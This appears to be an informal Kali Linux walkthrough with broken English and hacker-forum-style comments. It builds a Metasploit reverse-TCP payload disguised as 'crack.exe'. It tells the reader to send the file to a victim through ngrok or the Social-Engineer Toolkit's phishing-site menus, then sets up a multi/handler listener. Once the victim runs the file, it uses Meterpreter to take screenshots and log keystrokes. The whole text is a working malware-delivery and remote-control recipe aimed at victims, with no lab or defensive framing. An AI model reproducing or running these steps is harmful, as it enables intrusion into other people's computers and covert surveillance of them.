// First of all we needed a framework in Metasploitable So lets go first schedule.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST='YOUR IP' LPORT='4444(suggested)' -f exe > crack.exe
// We use this context bu it needed a metasploitable in your machine ORACLE VİRTUAL BOX. This code give us a malware and it could be in var/www/html files for work.
//This malware in YOURIP/crack.exe u can send your victim with ngrok or anyone else. But If u dont wanna use ngrok lets see 'setoolkit' in Kali Linux.
root@kali:~# setoolkit
select from menu:
1)Social-Engineering-Attack (choose one)
|||||||||||||||||||||||||||||||||||||||
2)Website Attack Vectors(choose one) //and create some site.
root@kali:~# msfvenom
|||||||||||||||||||||||||||||||||||||||
msf6> use exploit/multi/handler
msf6(exploit/multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6(exploit/multi/handler)> set LHOST 'YOUR IP'
LHOST => 'YOUR IP'
msf6(exploit/multi/handler)> set LPORT 4444
LPORT => 4444
[*]Strarted reverse TCP handler on 'YOUR IP':4444
//When u send malware and victim choose that your display will be like a;
meterpreter>screenshot //it give us a screenshot victim's pc screen 
meterpreter>use keylogger // and u can write what u want on screen :)
